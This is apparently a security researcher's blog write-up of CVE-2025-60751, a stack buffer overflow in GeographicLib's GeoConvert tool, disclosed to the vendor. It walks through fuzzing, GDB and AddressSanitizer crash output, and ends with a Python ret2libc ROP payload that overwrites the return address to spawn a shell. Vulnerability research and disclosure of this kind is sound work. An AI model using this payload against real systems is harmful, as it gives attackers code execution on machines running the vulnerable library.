<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>CVE-2025-60751 | zer0matt's blog</title>
  <meta name="description" content="Technical write-up of CVE-2025-60751 discovered by zer0matt.">
  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
  <style>
    :root {
      --bg: #fafafa;
      --text: #222;
      --link: #0366d6;
      --link-hover: #023e8a;
      --heading: #111;
      --muted: #666;
      --border: #e5e5e5;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: Consolas, "Lucida Console", monospace;
      background: var(--bg);
      color: var(--text);
      line-height: 1.6;
    }

    header {
      text-align: center;
      padding: 2.5rem 1rem 1rem;
    }

    header h1 {
      margin: 0;
      font-size: 2rem;
      color: var(--heading);
    }

    nav {
      margin-top: 1rem;
    }

    nav a {
      margin: 0 0.8rem;
      color: var(--link);
      text-decoration: none;
      font-weight: 500;
    }

    nav a:hover {
      color: var(--link-hover);
    }

    main {
      max-width: 800px;
      margin: 0 auto;
      padding: 3rem 1rem 4rem;
    }

    section {
      margin-bottom: 2rem;
    }

    section h2 {
      font-size: 1.5rem;
      color: var(--heading);
      margin-bottom: 0.5rem;
      border-bottom: 2px solid var(--border);
      padding-bottom: 0.3rem;
    }

    p {
      margin-bottom: 1rem;
    }

    a {
      color: var(--link);
      text-decoration: none;
    }

    a:hover {
      color: var(--link-hover);
      text-decoration: underline;
    }

    footer {
      text-align: center;
      border-top: 1px solid var(--border);
      color: var(--muted);
      padding: 2rem 1rem;
      font-size: 0.9rem;
    }

    .badge {
      display: inline-block;
      background: #e5e5e5;
      color: #111;
      font-weight: 500;
      padding: 0.2rem 0.5rem;
      border-radius: 0.4rem;
      margin-right: 0.5rem;
      font-size: 0.95rem;
    }

    /* Snippet code box */
    .pre-block {
      background: #f7f7f8;
      color: #111;
      padding: 1rem;
      border-radius: 6px;
      border: 1px solid #e6e6e6;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace;
      font-size: 0.92rem;
      line-height: 1.45;
      white-space: pre;
      overflow: auto;      /* scroll both horizontally and vertically */
      max-height: 60vh;    /* vertical scroll when content is tall */
      word-break: normal;
    }

    .pre-block:hover {
      box-shadow: 0 6px 24px rgba(0,0,0,0.06);
    }
  </style>
</head>
<body>
  <header>
    <h1>CVE-2025-60751 – GeographicLib Stack Buffer Overflow</h1>
    <nav>
      <a href="https://zer0matt.github.io/">Home</a>
      <a href="https://zer0matt.github.io/about/">About</a>
      <a href="https://zer0matt.github.io/vulnerability/">Vulnerabilities</a>
      <a href="https://github.com/zer0matt" target="_blank">GitHub</a>
      <a href="https://www.linkedin.com/in/rosario-matteo-grammatico/" target="_blank">Linkedin</a>
    </nav>
  </header>

  <main>
    <section>
      <h2>Overview</h2>
      <p>This write-up covers the discovery of a Stack Buffer Overflow vulnerability in GeographicLib. The CVE-2025-60751 allows an attacker to potentially execute arbitrary code and cause a Denial of Service (Crash) under certain conditions.</p>
      <p>For more official information, see the CVE entry: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-60751" target="_blank">CVE-2025-60751</a>.</p>
    </section>

    <section>
      <h2>Confirmed vulnerable versions</h2>
      <p>Affected product: Geographiclib v2.5.1</p>
      <p>The versions prior to v2.5.1 are likely to be vulnerable as well. But since I didn't test them I cannot confirm that.</p>
    </section>

    <section>
      <h2>CVSS:3.1 Score</h2>
      <p>7.5 High - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</p>
    </section>

    <section>
      <h2>Technical Analysis</h2>
      <p>The vulnerability stems from improper bounds checking in GeographicLib when processing specific inputs. This can lead to a stack buffer overflow, causing a Denial of Service (crash) of the application and potentially allowing code execution.</p>
      <p>An attacker could also exploit this vulnerability to hijack the program's control flow by overwriting a return address to point to a libc function (ret2libc) and execute arbitrary code using a ROP chain.</p>
      <p>Tested on Kali Linux 6.12.25-amd64 (Virtual Machine)</p>
      <p>Geographiclib version: r2.5.1</p>
      <p>Detailed analysis, PoC, and mitigations are covered here.</p>
      <h3>Introduction</h3>
	  <p>GeographicLib is a C++ library used for many tasks, including:</p>
	  <ul>
	    <li>geodesic and rhumb line calculations;</li>
		<li>computations on a triaxial ellipsoid;</li>
		<li>gravity (e.g., EGM2008) and geomagnetic field (e.g., WMM2020) calculations;</li>
		<li>conversions between geographic, UTM, UPS, MGRS, geocentric, and local cartesian coordinates (GeoConvert);</li>
	  </ul>
	  <p>
	  And it is this last component that the vulnerability focuses on.
		I used the AFL++ fuzzer to generate crafted payloads to study GeoConvert's behavior when it receives specific inputs.
		After hours of fuzzing, there they were, inputs that generated SEGFAULT and crashed the program.
		In a program written in C/C++, memory management can be critical, and it is not unusual to find memory corruption vulnerabilities.
		An input that crashes the program with a Segmentation Fault can be very interesting to analyze and worth investigating to see what is happening.
	  </p>
	  <h3>Crash analysis</h3>
	  <p>
	  After reproducing the crash, I decided to analyze it with the GDB gnu debugger.
	  <div class="pre-block">matt@kali:~$ gdb --args /home/matt/geographiclib/tools/GeoConvert < /home/matt/geographiclib/tools/out/default/crashes/id:000000,sig:11,src:000640,time:72154,execs:269187,op:havoc,rep:2
      [...]
      [ Legend: Modified register | Code | Heap | Stack | String ]
      ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
      $rax   : 0x1               
      $rbx   : 0x1               
      $rcx   : 0x00005555555b1d10  →  0x00005555555a99d2  →  0x0073656572676564 ("degrees"?)
      $rdx   : 0x1               
      $rsp   : 0x00007fffffffce08  →  0x0000555555585ec8  →  <GeographicLib::DMS::InternalDecode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, GeographicLib::DMS::flag&)+1e68> mov r14, rax
      $rbp   : 0x3               
      $rsi   : 0xe               
      $rdi   : 0x1               
      $rip   : 0x00007ffff7b71119  →   vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]
      $r8    : 0x00007ffff7bf1ac0  →  0x0000000000000000
      $r9    : 0x1               
      $r10   : 0x6               
      $r11   : 0x0               
      $r12   : 0xa               
      $r13   : 0x11              
      $r14   : 0x00005555555b2508  →  0x00005555555b7800  →  <__afl_area_initial+0000> add BYTE PTR [rax], al
      $r15   : 0x00007fffffffceb0  →  0xffffffffffffffff
      $eflags: [zero CARRY PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
      $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
      ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
      0x00007fffffffce08│+0x0000: 0x0000555555585ec8  →  <GeographicLib::DMS::InternalDecode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, GeographicLib::DMS::flag&)+1e68> mov r14, rax    ← $rsp
      0x00007fffffffce10│+0x0008: 0x00007fffffffce54  →  0xffffd19800000000
      0x00007fffffffce18│+0x0010: 0x00007ffff7c091e8  →  0x0000000000000000
      0x00007fffffffce20│+0x0018: 0x00007ffff7fc0788  →  0x00007ffff7ffe310  →  0x0000555555554000  →   jg 0x555555554047
      0x00007fffffffce28│+0x0020: 0x0000000000000006
      0x00007fffffffce30│+0x0028: 0x0000000000000000
      0x00007fffffffce38│+0x0030: 0x00007fffffffce48  →  0x00005555557cb300  →  0x00005555555b1c30  →  0x00007ffff7e56be8  →  0x00007ffff7cb4230  →  <__cxxabiv1::__si_class_type_info::~__si_class_type_info()+0000> endbr64 
      0x00007fffffffce40│+0x0038: 0x0000000000000000
      ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
         0x7ffff7b71109                  and    eax, 0xfff
         0x7ffff7b7110e                  cmp    eax, 0xfe0
         0x7ffff7b71113                  ja     0x7ffff7b71250
       → 0x7ffff7b71119                  vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]
         0x7ffff7b7111d                  vpmovmskb eax, ymm1
         0x7ffff7b71121                  test   eax, eax
         0x7ffff7b71123                  je     0x7ffff7b71180
         0x7ffff7b71125                  tzcnt  eax, eax
         0x7ffff7b71129                  vzeroupper 
      ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
      [#0] Id 1, Name: "GeoConvert", stopped 0x7ffff7b71119 in ?? (), reason: SIGSEGV
      ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
      [#0] 0x7ffff7b71119 → vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]
      [#1] 0x555555585ec8 → std::char_traits<char>::length(__s=0x1 <error: Cannot access memory at address 0x1>)
      [#2] 0x555555585ec8 → std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(this=0x7fffffffcea0, __s=0x1 <error: Cannot access memory at address 0x1>, __a=<optimized out>)
      [#3] 0x555555585ec8 → GeographicLib::DMS::InternalDecode(dmsa="77777'777:::::::::", ind=@0x7fffffffd1e4)
      [#4] 0x5555555827de → GeographicLib::DMS::Decode(dms=<optimized out>, ind=@0x7fffffffd27c)
      [#5] 0x55555558e47e → GeographicLib::DMS::DecodeLatLon(stra=<error reading variable: Cannot access memory at address 0x9>, strb="\036.", lat=@0x7fffffffd698, lon=@0x7fffffffd6a0, longfirst=0xc0)
      [#6] 0x555555560803 → GeographicLib::GeoCoords::Reset(this=0x7fffffffd698, s=<optimized out>, centerp=0x1, longfirst=0x0)
      [#7] 0x55555555c43d → main(argc=<optimized out>, argv=<optimized out>)
      
	  </div>
	  </p>
	  <p>I recompiled the whole project with ASAN flags to check for any memory corruption and I got the message I was waiting for: <b>Stack buffer overflow.</b></p>
      <!-- Updated code snippet box -->
      <div class="pre-block">
=================================================================
==397936==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fd8710025f8 at pc 0x55fd04b95f7e bp 0x7ffff9a7f7d0 sp 0x7ffff9a7f7c8
WRITE of size 8 at 0x7fd8710025f8 thread T0
    #0 0x55fd04b95f7d in GeographicLib::DMS::InternalDecode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, GeographicLib::DMS::flag&) /home/matt/geographiclib/src/DMS.cpp:291:22
    #1 0x55fd04b8c597 in GeographicLib::DMS::Decode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, GeographicLib::DMS::flag&) /home/matt/geographiclib/src/DMS.cpp:178:12
    #2 0x55fd04b96ed7 in GeographicLib::DMS::DecodeLatLon(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, double&, double&, bool) /home/matt/geographiclib/src/DMS.cpp:368:9
    #3 0x55fd04b6da24 in GeographicLib::GeoCoords::Reset(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, bool, bool) /home/matt/geographiclib/src/GeoCoords.cpp:35:7
    #4 0x55fd04b697c9 in main /home/matt/geographiclib/tools/GeoConvert.cpp:188:11
    #5 0x7fd8727f4ca7 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #6 0x7fd8727f4d64 in __libc_start_main csu/../csu/libc-start.c:360:3
    #7 0x55fd04a83a00 in _start (/home/matt/geographiclib/tools/GeoConvert+0x36a00) (BuildId: 79250b7b698dfd6b71946007b7b4be0f1ef38cf2)

Address 0x7fd8710025f8 is located in stack of thread T0 at offset 1528 in frame
    #0 0x55fd04b8d75f in GeographicLib::DMS::InternalDecode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, GeographicLib::DMS::flag&) /home/matt/geographiclib/src/DMS.cpp:192

  This frame has 84 object(s):
    [...]
    [1504, 1528) 'ipieces' (line 235) <== Memory access at offset 1528 overflows this variable
    [...]
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /home/matt/geographiclib/src/DMS.cpp:291:22 in GeographicLib::DMS::InternalDecode(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, GeographicLib::DMS::flag&)
Shadow bytes around the buggy address:
  0x7fd871002300: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x7fd871002380: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x7fd871002400: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x7fd871002480: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
  0x7fd871002500: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8
=>0x7fd871002580: f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2 00 00 00[f2]
  0x7fd871002600: f2 f2 f2 f2 00 00 00 f2 f2 f2 f2 f2 00 f2 f2 f2
  0x7fd871002680: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2
  0x7fd871002700: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2
  0x7fd871002780: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2
  0x7fd871002800: f8 f8 f8 f8 f2 f2 f2 f2 f8 f8 f8 f8 f2 f2 f2 f2
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==397936==ABORTING
      </div>
	  <p>
	  This confirms there is a Stack buffer overflow vulnerability! And it is found at DMS.cpp:291; due to an improper validation of the internal index <code class="language-plaintext highlighter-rouge">k</code> in the <code class="language-plaintext highlighter-rouge">ipieces</code> array, it generates an out-of-bounds write on the stack.
	  <img src="geo4-cropped.png" alt="ipiecesoutofboundsindex" style="display:block; margin:0 auto; max-width:100%;">
	  </p>
	  <h3>Exploit</h3>
	  <p>
	      Now it's time to see if and how we can exploit it and take advantage of it.
	      Is the impact limited to a Denial of Service (crash application) or can we aim for something more?
	  </p>
	  <p>
	      First, I used checksec to see what security properties the GeoConvert binary has:
	      <div class="pre-block">matt@kali:~$ checksec --file=/home/matt/geographiclib/tools/GeoConvert             
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   635 Symbols     Yes     4               6     	       /home/matt/geographiclib/tools/GeoConvert
	      </div>
	      Based on the output, which showed me the security measures implemented such as "NX protection", I decided to try a return-to-libc attack.
	  </p>
	  <p>The choice to use this technique is not random, it is often used to bypass the "NX protection", therefore it can be useful and can lead us to a successful exploitation.</p>
	  <p>In order to launch a ret2libc attack we need three things:</p>
	  <ul>
	  <li>system() address;</li>
	  <li>/bin/sh address;</li>
	  <li>exit() address;</li>	      
	  </ul>
	  <p>Now, in order to exploit it successfully we need to collect them and join all of 'em into a ROP Chain; to build it we're gonna use ROPgadget application.</p>
	  
	  <p>Having all them combined together, we can build a successful exploit:</p>
	  <div class="pre-block">
# --- REPLACE THE ADDRESSES WITH YOUR OWN ONES ---
pop_rdi = 0x000055555558BEFD
ret_gadget = 0x000055555558A016
system_addr = 0x7ffff7a5d110
binsh_addr = 0x7ffff7bb1ea4
exit_addr = 0x7ffff7a4c340

# --- PAYLOAD ---
offset = 136
payload = b"A" * offset
payload += p64(ret_gadget)   # stack align
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(binsh_addr)   # "/bin/sh" address
payload += p64(system_addr)  # system("/bin/sh")
payload += p64(exit_addr)    # exit
	      
	  </div>
	  <img src="screenshot_2025-10-22_10_29_20-cropped.png" alt="Ret2libc" style="display:block; margin:0 auto; max-width:100%;">
	  <p>By doing so, we're able to overwrite the return address with the system(/bin/sh) and spawn a shell.
	  A PoC is available at <a href="https://github.com/zer0matt/CVE-2025-60751" target="_blank">https://github.com/zer0matt/CVE-2025-60751</a></p>
    </section>

    <section>
      <h2>Disclosure Timeline</h2>
      <ul>
        <li>Discovery: 21 August 2025</li>
        <li>Vendor Notified: 21 August 2025</li>
        <li>Public Disclosure: 21 October 2025</li>
        <li>CVE Assigned: CVE-2025-60751</li>
      </ul>
    </section>

    <section>
      <h2>References & Resources</h2>
      <ul>
        <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-60751" target="_blank">CVE-2025-60751</a></li>
        <li><a href="https://github.com/zer0matt/CVE-2025-60751" target="_blank">GitHub – zer0matt's CVE-2025-60751 Proof of Concept</a></li>
        <li><a href="https://github.com/geographiclib/geographiclib/issues/43" target="_blank">GitHub – Issue</a></li>
      </ul>
    </section>
  </main>

  <footer>
    © 2025 zer0matt. All rights reserved.
  </footer>

</body>
</html>